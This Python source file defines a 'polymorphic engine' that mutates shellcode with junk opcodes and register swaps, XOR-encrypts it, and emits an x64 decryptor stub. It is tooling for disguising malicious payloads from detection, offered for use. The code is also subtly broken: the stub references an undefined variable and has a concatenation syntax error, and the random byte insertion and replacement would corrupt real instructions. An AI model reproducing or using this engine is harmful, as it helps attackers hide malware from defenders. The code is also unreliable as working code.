import random
import struct
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class PolymorphicEngine:
	def __init__(self, key=None):
		self.key = key or self.generate_key()
		
	def generate_key(self):
		"""Generate a 32-byte key using PBKDF2"""
		salt = random.randbytes(16)
		kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
		return kdf.derive(random.randbytes(32))

	def mutate(self, shellcode):
		"""Apply polymorphism: junk insertion, register swapping, etc."""
		mutated = bytearray(shellcode)
		
		# Insert random NOP-like junk (e.g., harmless instructions)
		junk_opcodes = [b'\x90', b'\xeb\x0c', b'\x8d\x40\x00']  # NOP, JMP $+14, LEA EAX,[EAX+00]
		for _ in range(random.randint(1, 5)):
			pos = random.randint(0, len(mutated))
			mutated[pos:pos] = junk_opcodes[random.randint(0, len(junk_opcodes)-1)]
			
		# Swap registers (EAX <-> ECX, etc.)
		register_swaps = {b'\x50': b'\x51', b'\x53': b'\x55'}  # PUSH EAX -> PUSH ECX, etc.
		for op, replacement in register_swaps.items():
			if op in mutated:
				mutated = mutated.replace(op, replacement)
				
		return bytes(mutated)

	def encrypt(self, shellcode):
		"""XOR encrypt shellcode with dynamic key"""
		encrypted = bytearray()
		key = self.key[:len(shellcode)]
		for i in range(len(shellcode)):
			encrypted.append(shellcode[i] ^ key[i % len(key)])
		return encrypted

	def generate_decryptor_stub(self):
		"""Generate architecture-specific decryptor (x64 example)"""
		stub = (
			b"\x48\x31\xc9"             # xor rcx, rcx
			b"\x48\x81\xe9" + struct.pack("<I", len(shellcode)) + # sub rcx, -len
			b"\x48\x8d\x05\xef\xff\xff\xff" # lea rax, [rip - 11]
			b"\x48\x31\xd2"             # xor rdx, rdx
			b"\x80\x34\x08" + struct.pack("B", self.key[0]) # xor byte [rax+rcx], key_byte
			b"\x48\xff\xc1"             # inc rcx
			b"\x48\x39\xc8"             # cmp rax, rcx
			b"\x75\xf5"                 # jne loop
		)
		return stub